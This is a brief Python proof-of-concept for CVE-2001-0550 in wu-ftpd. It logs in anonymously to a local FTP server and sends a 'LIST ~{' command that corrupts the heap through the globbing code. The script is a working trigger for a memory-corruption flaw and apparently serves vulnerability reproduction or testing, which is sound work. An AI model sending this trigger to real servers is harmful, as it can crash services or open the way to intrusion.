#!/usr/bin/env python3
"""
PoC: CVE-2001-0550 - wu-ftpd File Globbing Heap Corruption
Trigger: Send "~{" pattern in LIST/CWD command to corrupt heap via ftpglob
"""

import socket

s = socket.socket()
s.connect(("localhost", 2124))
s.recv(1024)  # banner

# Login
s.send(b"USER anonymous\r\n")
s.recv(1024)
s.send(b"PASS test@test.com\r\n")
s.recv(1024)

# CVE-2001-0550: The "~{" pattern is not handled properly by glob function
# This causes heap corruption in the ftpglob code
s.send(b"LIST ~{\r\n")
s.recv(1024)
s.close()
